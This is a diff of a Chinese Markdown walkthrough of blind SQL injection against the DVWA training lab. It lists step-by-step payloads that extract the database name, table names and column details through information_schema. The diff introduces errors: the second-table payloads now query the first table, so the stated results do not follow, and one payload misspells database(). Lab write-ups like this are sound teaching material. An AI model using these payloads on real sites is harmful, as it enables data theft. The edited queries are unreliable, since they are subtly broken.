@@ -53,37 +53,40 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 ![image](https://user-images.githubusercontent.com/71583369/144705355-8a77e260-3246-4cab-8efd-bfadc7290919.png)
 - 查看爆破结果，数据库长度为4
 ![image](https://user-images.githubusercontent.com/71583369/144705266-dd7641f9-354e-44cd-99ce-ac0df26dcc60.png)
-- 判断数据库名的第一个字母，构造`1’ and ascii(substr(databse(),1,1))＝100 #`使用ascii值进行判断，然后再对照ascii表判断对应的字母
+- 判断数据库名的第一个字母，构造`1' and ascii(substr(databse(),1,1))＝100 #`使用ascii值进行判断，然后再对照ascii表判断对应的字母
 - 函数用法：`substr(string string,num start,num length);`
-- 大写字母A~Z对应的ASCII码（十进制）为“65”~“90”
-- 小写字母a~z对应的百ASCII码（十进制）为"97"~“122”
+- `大写字母A~Z对应的ASCII码（十进制）为“65”~“90”`
+- `小写字母a~z对应的百ASCII码（十进制）为"97"~“122”`
 #
 - 这里可以看住最小的值为65，最大值为122，我们构造一个数字的字典从65到122。
 ![image](https://user-images.githubusercontent.com/71583369/144706626-10208ad6-4e9a-4e31-ad12-0a029b34b978.png)
 - 可以看到100的时候与其他的长度不一样，100对应的是d，可以判断第一个字母为d
 ![image](https://user-images.githubusercontent.com/71583369/144706481-9b7ea7d5-6d98-432a-a19c-f32ff2c362fc.png)
-- 判断第二字符，只需要修改为`1’ and ascii(substr(database(),2,1))＝100 #`即可，后面的以此类推，分别取不同的位置，爆出数据库名为dvwa。
+- 判断第二字符，只需要修改为`1' and ascii(substr(database(),2,1))＝100 #`即可，后面的以此类推，分别取不同的位置，爆出数据库名为dvwa。
 3. 猜解表名
-- 判断数据库中有几个表，构造`1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 #`
+- 判断数据库中有几个表，构造`1' and (select count (table_name) from information_schema.tables where table_schema=database() )=2 #`
 ![image](https://user-images.githubusercontent.com/71583369/144706910-7bc6433e-9cb5-468e-afe0-53e646de0980.png)
 #
-- 说明有两张表，判断第一张表的长度`1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # `
+- 说明有两张表，判断第一张表的长度`1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # `
 ![image](https://user-images.githubusercontent.com/71583369/144707338-e8f14150-899f-4592-a07f-3e59f783f26c.png)
 #
 - 说明长度为9
-- 判断第一个字母，构造`1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))＝103 #`
+- 判断第一个字母，构造`1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))＝103 #`
 ![image](https://user-images.githubusercontent.com/71583369/144707480-8ba0e7d5-56e9-49f0-b9da-585a00ab6548.png)
 #
 - 判断第一个字母为g，以此类推，第一个表为guestbook
-- 判断第二张表长度，构造`1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 #`
-- 判断第一个字母，构造`1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117 #`
+- 判断第二张表长度，构造`1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2))=5 #`
+- 判断第一个字母，构造`1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 #`
 - 第二张表名为users
 4. 猜字段名
-- 猜字段数`1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # `,为8个字段
+- 猜字段数`1' and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # `,为8个字段
 ![image](https://user-images.githubusercontent.com/71583369/144708090-e719b6b7-b8e4-483f-a95d-ad763e08003c.png)
-- 第一个字段长度`1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7 #`,长度为7
+- 第一个字段长度`1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7 #`
 ![image](https://user-images.githubusercontent.com/71583369/144708264-f649c9ef-7eac-4eae-9986-aa954362bc78.png)
-
+#
+长度为7,后续不再演示。
+## 参考链接
+https://www.cnblogs.com/karentec/articles/10621633.html
 
 
 
